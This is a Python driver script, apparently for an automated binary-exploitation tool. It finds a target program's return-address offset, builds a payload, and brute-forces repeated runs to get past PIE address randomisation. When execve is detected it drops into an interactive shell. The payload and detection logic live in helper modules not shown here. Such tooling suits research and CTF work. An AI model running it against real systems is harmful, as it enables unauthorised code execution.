from utils import *
from payload_utils import *
from exploit_utils import *

def main():
        
    if len(sys.argv) < 2:
        print("No target binary provided")
        sys.exit(1)

    args = check_args()
    target_bin = args.target

    context.log_level='warn'
    # context.log_level = 'debug'

    #this program has PIE enabled -> compilation option that changes the location of the executable in every run


    #this has to change: i need the offset of the ra but i also need all the content inbetween that allows the crash to happen to eip
    #it is definitely not a given that i will need only "aaaa...aaa" to reach the eip, i have to explore the bugs that occur to make sure i hit the right one
    # ra_offset = locate_ra(generate_testcase(), target_bin)
    ra_offset = locate_ra(generate_testcase(), target_bin)


    #payload builder will need more than the distance of the buffer and the ra. It will need all the constraints for the eip crash to happen
    build_payload(ra_offset, target_bin)
    exploit_cmd = build_command(target_bin, args.exploit_args)
    attach_strace()

    #performing brute force attack
    i = 0
    while True:
        print(f"Attempt: {i}")
        i += 1
        exploit_proc = run_exploit(exploit_cmd)
        
        try:
            while True:

                if detect_execve():
                    shell(exploit_proc)

                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()


if __name__ == "__main__":
    main()